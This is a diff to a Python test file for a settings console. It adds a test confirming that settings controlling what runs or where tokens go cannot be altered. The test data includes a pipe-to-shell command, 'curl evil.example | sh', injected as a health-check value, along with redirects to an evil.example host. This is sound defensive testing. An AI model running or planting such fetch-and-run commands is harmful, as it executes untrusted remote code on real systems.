@@ -212,7 +212,7 @@ def test_the_whole_file_as_yaml_and_putting_a_version_back(w):
 
 def test_a_change_setup_applies_says_so(w):
     admin = signed_in(w.settings, "owner@example.com")
-    r = change(admin, "console", **{"console.port": "8080"})
+    r = change(admin, "bulava", **{"bulava.claude_checks.rounds": "2"})
     assert "setup.sh" in r.text and "run setup, then restart the runner" in r.text
     r = save_preview(admin, r.text)
     assert "run+setup" in r.headers["location"] or "setup" in r.headers["location"]
@@ -409,37 +409,48 @@ def test_the_yaml_editor_on_a_stale_page_shows_what_changed_on_the_server(w):
     assert r.status_code == 409 and "+  poll_off_hours: 20m" in r.text and "+  max_ci_fix_attempts: 4" in r.text
 
 
-@pytest.mark.parametrize("where, setup", [("/srv/qa-runs", True), ("DATA/qa/elsewhere", False)])
-def test_moving_a_reports_folder_out_of_what_the_console_sees_needs_setup(w, where, setup):
-    where = where.replace("DATA", str(w.config.parent))
+def test_settings_that_decide_what_runs_or_where_tokens_go_are_shown_and_never_changed(w):
+    """A form sent with them changed changes nothing of them; the YAML editor refuses them; a direct save too."""
+    before = w.config.read_text()
     admin = signed_in(w.settings, "owner@example.com")
-    r = change(admin, "qa", **{"qa.reports": where})
-    assert ("run setup, then restart the runner" in r.text) is setup
-    assert ("restart the runner</strong> after saving" in r.text) is (not setup)
-    page = admin.get("/settings/qa/").text
-    assert "outside the data folder, setup.sh has to run first" in page
+    page = admin.get("/settings/health/").text
+    assert "set on the server" in page
+    for section, values in (("qa", {"qa.reports": "/srv/qa-runs"}), ("paths", {"paths.bulava_env": "/tmp/evil.env"}),
+                            ("code_host", {"code_host.url": "https://evil.example.com"}),
+                            ("bulava", {"bulava.mcp_config": "/tmp/mcp.json"})):
+        r = change(admin, section, **values)
+        assert "Nothing changed" in r.text, section
+    assert w.config.read_text() == before
+    text = before.replace("health:\n", "health:\n  devstack_check: \"curl evil.example | sh\"\n", 1)
+    page = admin.get("/settings/yaml/").text
+    r = admin.post("/settings/yaml/", data={"csrf": csrf_of(page), "text": text,
+                                            "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
+    assert "health.devstack_check: set on the server" in r.text and "Save config.yaml" not in r.text
+    r = admin.post("/settings/save", data={"csrf": csrf_of(page), "text": text, "origin": "/settings/yaml/",
+                                           "sha": re.search(r'name="sha" value="([^"]+)"', page).group(1)})
+    assert "set on the server" in r.text
+    assert w.config.read_text() == before
 
 
 def test_clearing_an_optional_setting_and_filling_it_again_keeps_one_key(w):
-    """bulava.mcp_config emptied (null in the file), saved, then given a path again, saved: the same line is
+    """tracker.assignee_field emptied (null in the file), saved, then given a name again, saved: the same line is
     replaced each time, never a second key; the pages still open; every other line is the original's."""
     original = w.config.read_text()
     admin = signed_in(w.settings, "owner@example.com")
-    r = change(admin, "bulava", **{"bulava.mcp_config": ""})
+    r = change(admin, "tracker", **{"tracker.assignee_field": ""})
     assert save_preview(admin, r.text).status_code == 303
-    cleared = w.config.read_text()
-    assert yaml.safe_load(cleared)["bulava"]["mcp_config"] is None
-    r = change(admin, "bulava", **{"bulava.mcp_config": "/opt/new.json"})
+    assert yaml.safe_load(w.config.read_text())["tracker"]["assignee_field"] is None
+    r = change(admin, "tracker", **{"tracker.assignee_field": "Owner"})
     assert "Save config.yaml" in r.text
     assert save_preview(admin, r.text).status_code == 303
     filled = w.config.read_text()
-    assert len(re.findall(r"^\s+mcp_config:", filled, re.M)) == 1
-    assert yaml.safe_load(filled)["bulava"]["mcp_config"] == "/opt/new.json"
-    assert changed_lines(original, filled) == [x for x in changed_lines(original, filled) if "mcp_config" in x]
+    assert len(re.findall(r"^\s+assignee_field:", filled, re.M)) == 1
+    assert yaml.safe_load(filled)["tracker"]["assignee_field"] == "Owner"
     assert len(changed_lines(original, filled)) == 2
-    for path in ("/settings/", "/settings/bulava/", "/settings/yaml/", "/settings/history/"):
+    assert all("assignee_field" in x for x in changed_lines(original, filled))
+    for path in ("/settings/", "/settings/tracker/", "/settings/yaml/", "/settings/history/"):
         assert admin.get(path).status_code == 200, path
-    assert 'value="/opt/new.json"' in admin.get("/settings/bulava/").text
+    assert 'value="Owner"' in admin.get("/settings/tracker/").text
 
 
 def test_a_key_written_twice_is_refused_and_the_pages_say_so(w):
